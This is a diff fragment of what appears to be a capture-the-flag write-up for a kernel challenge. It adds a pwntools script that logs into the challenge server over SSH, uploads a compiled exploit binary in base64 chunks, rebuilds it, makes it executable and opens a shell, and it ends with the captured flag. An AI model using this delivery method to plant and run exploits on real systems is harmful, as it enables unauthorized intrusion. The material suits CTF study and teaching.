@@ -178,5 +178,39 @@ int main(int argc, char const *argv[])
 }
 ```
 
+upload.py
+```python
+#musl-gcc -static exp.c -o ./fs/home/pwn/exp
+from pwn import *
+import base64
+context(log_level='debug', arch='amd64')
+
+HOST = "35.221.78.115"
+PORT =  10022
+USER = "pwn"
+PW = "pwn"
+BIN = "./fs/home/pwn/exp"
+
+def exec_cmd(sh, cmd):
+	sh.sendline(cmd)
+	sh.recvuntil("$ ")
+
+if __name__ == "__main__":
+	sh = ssh(USER, HOST, PORT, PW).run("/bin/sh")
+	with open(BIN, "rb") as f:
+		data = f.read()
+	encoded = base64.b64encode(data)
+	sh.recvuntil("$ ")
+
+	once_size = 0x200
+	for i in range(0, len(encoded), once_size):
+		exec_cmd(sh, "echo -n \"%s\" >> benc" % (encoded[i:i+once_size]))
+		print float(i)/len(encoded)
+
+	exec_cmd(sh, "cat benc | base64 -d > exp")
+	exec_cmd(sh, "chmod +x exp")
+	sh.interactive()
+```
 
 
+`*CTF{userf4ult_fd_m4kes_d0uble_f3tch_perfect}`
